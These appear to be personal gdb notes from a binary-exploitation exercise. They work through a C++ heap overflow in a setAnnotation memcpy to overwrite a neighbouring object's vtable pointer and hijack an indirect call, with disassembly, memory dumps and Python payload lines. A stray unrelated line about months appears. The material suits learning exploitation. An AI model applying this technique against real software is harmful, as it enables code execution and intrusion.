break within setannotation memcpy

(gdb) b *0x08048733

(gdb) info func
...
0x0804870e  N::setAnnotation(char*)
...
(gdb) disas 0x0804870e

Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:	push   %ebp
   0x0804870f <+1>:	mov    %esp,%ebp
   0x08048711 <+3>:	sub    $0x18,%esp
   0x08048714 <+6>:	mov    0xc(%ebp),%eax
   0x08048717 <+9>:	mov    %eax,(%esp)
   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
   0x0804871f <+17>:	mov    0x8(%ebp),%edx
   0x08048722 <+20>:	add    $0x4,%edx
   0x08048725 <+23>:	mov    %eax,0x8(%esp)
   0x08048729 <+27>:	mov    0xc(%ebp),%eax
   0x0804872c <+30>:	mov    %eax,0x4(%esp)
   0x08048730 <+34>:	mov    %edx,(%esp)
=> 0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:	leave
   0x08048739 <+43>:	ret




(gdb) disas main

0x080485f4 <+0>:	push   %ebp
   0x080485f5 <+1>:	mov    %esp,%ebp
   0x080485f7 <+3>:	push   %ebx
   0x080485f8 <+4>:	and    $0xfffffff0,%esp
   0x080485fb <+7>:	sub    $0x20,%esp
   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	movl   $0x1,(%esp)
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	movl   $0x6c,(%esp)
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   --> break *0x0804861c
   ==> eax = 0x804a008
   0x0804861c <+40>:	mov    %eax,%ebx
   0x0804861e <+42>:	movl   $0x5,0x4(%esp)
   0x08048626 <+50>:	mov    %ebx,(%esp)
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:	movl   $0x6c,(%esp)
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   --> break *0x0804863e
   ==> eax = 0x804a078
   0x0804863e <+74>:	mov    %eax,%ebx
   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
   0x08048648 <+84>:	mov    %ebx,(%esp)
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    %ebx,0x18(%esp)
   0x08048654 <+96>:	mov    0x1c(%esp),%eax
   0x08048658 <+100>:	mov    %eax,0x14(%esp)
   0x0804865c <+104>:	mov    0x18(%esp),%eax
   0x08048660 <+108>:	mov    %eax,0x10(%esp)
   0x08048664 <+112>:	mov    0xc(%ebp),%eax
   0x08048667 <+115>:	add    $0x4,%eax
   0x0804866a <+118>:	mov    (%eax),%eax
   0x0804866c <+120>:	mov    %eax,0x4(%esp)
   0x08048670 <+124>:	mov    0x14(%esp),%eax
   0x08048674 <+128>:	mov    %eax,(%esp)
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
   0x08048680 <+140>:	mov    (%eax),%eax
   0x08048682 <+142>:	mov    (%eax),%edx
   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   --> break *0x08048693
   ==> edx = 0x804873a
   ==> p /x *$edx
       $6 = 0x8be58955
   0x08048693 <+159>:	call   *%edx
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:	leave
   0x08048699 <+165>:	ret

Analyze:
run BBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC

The param given as parameter is written at 0x804a008+0x4 = 0x804a00c and it can overflow.

We see a call here.
   0x08048693 <+159>:	call   *%edx

We want to control edx to call a shellcode we would have injected.

break *0x08048680
i r eax
eax            0x804a078	134520952

# At this point we understand eax points to the second struct allocated at 0x804a078

   0x08048680 <+140>:	mov    (%eax),%eax
# eax is dereferenced here eax = *eax, that's why we segfault with BBBB (0x42424242) there
# To write in this cell we need an offset of 0x0804a078 − 0x0804a008 - 4 = 108
# We run again with payload
(gdb) b *0x08048682
(gdb) i b
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x08048682 <main+142>
(gdb) run $(python -c 'print "A"*108 + "\x0c\xa0\x04\x08"')

   0x08048682 <+142>:	mov    (%eax),%edx
# Then derefrenced again 
...
   0x08048693 <+159>:	call   *%edx





b *0x08048680

(gdb) x/100x $eax
0x804d420:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d430:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d440:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d450:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d460:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d470:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d480:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d490:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d4a0:	0x41414141	0x41414141	0x41414141	0x43414141
0x804d4b0:	0x00434343	0x00000000	0x00000000	0x00000000
0x804d4c0:	0x00000000	0x00000000	0x00000000	0x00000000

(gdb) x/100x ($eax-0x6c)
0x804d3b4:	0x42424242	0x41414141	0x41414141	0x41414141
0x804d3c4:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d3d4:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d3e4:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d3f4:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d404:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d414:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d424:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d434:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d444:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d454:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d464:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d474:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d484:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d494:	0x41414141	0x41414141	0x41414141	0x41414141
0x804d4a4:	0x41414141	0x41414141	0x43414141	0x00434343
0x804d4b4:	0x00000000	0x00000000	0x00000000	0x00000000
0x804d4c4:	0x00000000	0x00000000	0x00000000	0x00000000


0x6c = 108

(gdb) run $(python2 -c "print 108*'A' + 'BBBB'")

(gdb) x/100x $eax
0x804d420:	0x42424242	0x00000000	0x00000000	0x00000000
0x804d430:	0x00000000	0x00000000	0x00000000	0x00000000

# Replace the BBBB (0x42424242) with the following address: 0x0804d424
# because it is dereferenced again on line 0x08048682 <+142>:	mov    (%eax),%edx 

run $(python2 -c "print 108*'A' + '\x24\xd4\x04\x08'")

0x804d3b4
\xb4\xd3\x04\x08

0x804a00c

0x804a078
\x78\xa0\x04\x08

aout septembre -> pour novembre
mars -> avril mai


---


(gdb) run AAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCC

We get a segfault on 0x08048682 when trying to dereference 0x42424242

# First struct 
(gdb) x/100x 0x804a008
0x804a008:	0x08048848	0x41414141	0x42424242	0x42424242
0x804a018:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a028:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a038:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a048:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a058:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a068:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a078:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a088:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a098:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a0a8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a0b8:	0x42424242	0x42424242	0x42424242	0x43434242
0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000

# Second struct
(gdb) x/100x 0x804a078
0x804a078:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a088:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a098:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a0a8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a0b8:	0x42424242	0x42424242	0x42424242	0x43434242
0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000



0x0804a078 − 0x0804a008 = 0x70 = 112
112 - 4 = 108
This is the offset to reach 0x804a078



-----


We break a bit before on 0x08048680
b *0x08048680

(gdb) x/100x $eax
0x804a078:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a088:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a098:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a0a8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a0b8:	0x42424242	0x42424242	0x42424242	0x43434242
0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
